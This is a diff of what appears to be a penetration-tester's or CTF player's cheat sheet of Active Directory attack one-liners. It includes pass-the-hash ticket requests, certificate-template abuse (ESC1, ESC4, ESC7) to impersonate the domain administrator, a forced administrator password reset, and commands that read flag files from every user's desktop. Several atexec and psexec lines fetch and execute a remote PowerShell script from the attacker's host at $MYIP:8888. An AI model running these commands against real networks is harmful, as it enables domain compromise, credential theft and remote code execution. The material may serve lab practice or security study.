@@ -207,8 +207,9 @@ net user administrator 123qweasdF!
 ## GG - ROOT FLAG
 impacket-getTGT -dc-ip $TARGET $DOM/'administrator' -hashes ':$HASH'; kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "cmd.exe /c for /d %F in (C:\Users\*) do for %f in (%F\Desktop\user.txt %F\Desktop\root.txt) do @if exist %f @type %f 2>NUL | findstr /R /C:\"^[0-9a-f][0-9a-f]*$\"" | grep -vE '\[|-' | xargs -n1 | gg
 
+impacket-atexec -dc-ip $TARGET $DOM/'administrator':'123qweasdF!'@$TARGET "cmd.exe /c for /d %F in (C:\Users\*) do for %f in (%F\Desktop\user.txt %F\Desktop\root.txt) do @if exist %f @type %f 2>NUL | findstr /R /C:\"^[0-9a-f][0-9a-f]*$\"" | grep -vE '\[|-' | xargs -n1 | gg
+
 impacket-getTGT -dc-ip $TARGET $DOM/'administrator':'123qweasdF!'; kcme
-impacket-atexec -dc-ip $TARGET $DOM/'administrator':'$PASSWORD'@$TARGET "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 impacket-atexec -dc-ip $TARGET $DOM/'administrator'@$TARGET -hashes ':$HASH' "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 impacket-psexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 impacket-psexec -dc-ip $TARGET $DOM/'administrator':'$PASSWORD'@$TARGET "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
@@ -593,12 +594,13 @@ impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes ':$HASH'; kcme
 
 +---------- ESC1 ----------+
 adminSid=$(certipy account -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -user 'administrator' read 2>/dev/null | grep 'objectSid' | cut -d ':' -f2 | xargs -n1); certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template '' -upn 'administrator' -sid "$adminSid" -target $DC -key-size '4096'
-
-+---------- ESC4 ----------+
-certipy template -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -template '' -write-default-configuration
 certipy auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator.pfx'
 change_password administrator 123qweasdF!
 evil-winrm -i '$TARGET' -u 'administrator' -p '123qweasdF!'
+impacket-atexec -dc-ip $TARGET $DOM/'administrator':'123qweasdF!'@$TARGET "cmd.exe /c for /d %F in (C:\Users\*) do for %f in (%F\Desktop\user.txt %F\Desktop\root.txt) do @if exist %f @type %f 2>NUL | findstr /R /C:\"^[0-9a-f][0-9a-f]*$\"" | grep -vE '\[|-' | xargs -n1 | gg
+
++---------- ESC4 ----------+
+certipy template -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -template '' -write-default-configuration
 
 +---------- ESC7 ----------+
 certipy ca -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -add-officer '$USERNAME' -target $DC
